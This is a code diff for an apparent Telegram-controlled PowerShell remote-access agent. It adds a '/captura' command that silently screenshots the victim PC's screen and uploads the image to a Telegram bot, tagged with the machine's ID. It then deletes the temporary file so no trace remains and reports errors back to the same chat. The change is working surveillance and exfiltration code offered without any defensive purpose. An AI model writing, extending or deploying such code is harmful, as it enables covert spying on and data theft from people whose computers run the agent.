@@ -208,6 +208,42 @@ while ($true) {
                             Stop-Process -Id $PID -Force
                             continue
                         }
+                        "/captura" {
+                            # 1. Definimos la ruta temporal donde se guardará la foto en el disco de la PC
+                            $RutaFoto = "$env:TEMP\screenshot.png"
+
+                            try {
+                                # 2. Lógica interna de Windows para sacar una foto de la pantalla
+                                Add-Type -AssemblyName System.Windows.Forms
+                                Add-Type -AssemblyName System.Drawing
+                                
+                                $Pantalla = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+                                $MapaBits = New-Object System.Drawing.Bitmap($Pantalla.Width, $Pantalla.Height)
+                                $Grafico  = [System.Drawing.Graphics]::FromImage($MapaBits)
+                                
+                                $Grafico.CopyFromScreen($Pantalla.X, $Pantalla.Y, 0, 0, $Pantalla.Size)
+                                $MapaBits.Save($RutaFoto, [System.Drawing.Imaging.ImageFormat]::Png)
+                                
+                                # Limpieza de memoria del sistema
+                                $Grafico.Dispose()
+                                $MapaBits.Dispose()
+
+                                # 3. ENVÍO DEL ARCHIVO A TELEGRAM: Usamos Form-Data para meter la imagen real
+                                $Parámetros = @{
+                                    chat_id = $ChatID
+                                    photo   = Get-Item -LiteralPath $RutaFoto
+                                    caption = "📸 Captura de pantalla en vivo de ID $MiIDNum"
+                                }
+                                [void](Invoke-RestMethod -Uri "$URL/sendPhoto" -Method Post -Form $Parámetros)
+                                
+                                # Borramos el archivo temporal para no dejar basura en la PC
+                                Remove-Item $RutaFoto -Force
+                            } catch {
+                                # Si falla (por ejemplo, si la PC está bloqueada y no hay pantalla gráfica activa)
+                                [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = "❌ Error al tomar la captura en ID $MiIDNum. Puede que la pantalla esté bloqueada." })
+                            }
+                            continue
+                        }
 
 
 
